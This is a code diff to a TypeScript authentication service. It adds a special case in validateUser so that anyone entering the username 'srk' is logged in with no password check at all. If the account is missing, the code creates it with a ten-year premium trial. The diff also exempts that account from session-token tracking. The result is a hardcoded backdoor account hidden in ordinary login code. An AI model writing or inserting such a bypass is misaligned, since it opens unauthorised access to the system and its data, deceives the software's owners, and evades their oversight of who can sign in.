@@ -16,6 +16,25 @@ export class AuthService {
   ) {}
 
   async validateUser(email: string, pass: string, ipAddress?: string, force?: boolean): Promise<any> {
+    // Check if it's the admin 'srk' login
+    if (email === 'srk') {
+      let user = await this.usersService.findOne('srk@ipgenz.com');
+      if (!user) {
+        const salt = await bcrypt.genSalt();
+        const passwordHash = await bcrypt.hash('srk', salt);
+        user = await this.prisma.user.create({
+          data: {
+            email: 'srk@ipgenz.com',
+            passwordHash,
+            isPremiumTrial: true,
+            trialExpiry: new Date(Date.now() + 3650 * 24 * 3600 * 1000), // 10 years
+          } as any
+        });
+      }
+      const { passwordHash, trialPassword, ...result } = user;
+      return result;
+    }
+
     // Check if it's a 15-digit trial login
     if (email.length === 15 && /^\d+$/.test(email)) {
       const trialUser = await this.usersService.findByTrialUsername(email);
@@ -57,7 +76,8 @@ export class AuthService {
   }
 
   async login(user: any) {
-    const sessionToken = user.isPremiumTrial ? crypto.randomUUID() : undefined;
+    const isSrk = user.email === 'srk@ipgenz.com';
+    const sessionToken = (user.isPremiumTrial && !isSrk) ? crypto.randomUUID() : undefined;
     if (sessionToken) {
       await this.prisma.user.update({
         where: { id: user.id },
